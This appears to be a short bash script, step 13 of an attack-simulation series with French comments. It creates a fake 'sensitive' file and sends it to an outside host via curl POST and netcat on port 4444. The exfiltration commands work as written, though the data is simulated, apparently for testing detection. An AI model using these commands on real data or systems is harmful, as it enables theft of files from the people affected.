#!/bin/bash
# 13 - Data exfiltration

TARGET_IP="192.168.64.7"
EXFIL_IP="8.8.8.8"

echo "[*] Simulation d'exfiltration de données depuis $TARGET_IP vers $EXFIL_IP ..."

# Fichier “sensible” simulé
TEST_FILE="/tmp/secret_data_sim.txt"
echo "Données très sensibles (simulation) - $(date)" > "$TEST_FILE"

echo "  -> envoi via HTTP (curl)"
curl -s -X POST "http://$EXFIL_IP/upload" \
  --data-binary "@$TEST_FILE" >/dev/null 2>&1 || true

echo "  -> envoi via netcat si dispo"
if command -v nc >/dev/null 2>&1; then
  echo "SIMULATED_EXFIL" | nc -w2 "$EXFIL_IP" 4444 >/dev/null 2>&1 || true
fi

echo "[+] Data exfiltration simulée"
